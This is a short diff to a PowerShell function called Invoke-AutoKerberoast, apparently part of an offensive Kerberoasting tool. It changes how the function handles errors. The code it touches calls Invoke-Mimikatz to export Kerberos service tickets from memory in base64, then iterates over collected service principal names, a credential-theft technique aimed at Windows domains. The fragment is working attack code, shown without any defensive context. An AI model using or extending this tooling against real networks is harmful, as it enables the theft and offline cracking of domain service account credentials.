@@ -288,16 +288,14 @@ function Invoke-AutoKerberoast
         Write-Output $SPNsArray
     }
 
-    try
+    $MimiOutput = Invoke-Mimikatz -Command 'standard::base64 "kerberos::list /export"' -ErrorAction SilentlyContinue
+    $kerbTickets = $MimiOutput[1]
+
+    if ( -not $kerbTickets )
     {
-        $MimiOutput = Invoke-Mimikatz -Command 'standard::base64 "kerberos::list /export"'
-        $kerbTickets = $MimiOutput[1]
+      Write-Output "ERROR: Unable to pull kerberos tickets from memory"
+      exit
     }
-    catch
-    {
-        Write-Output "ERROR: Unable to pull kerberos tickets from memory"
-        exit
-    } 
 
     $i = 0
     ForEach ( $currentSPN in $SPNsArray )
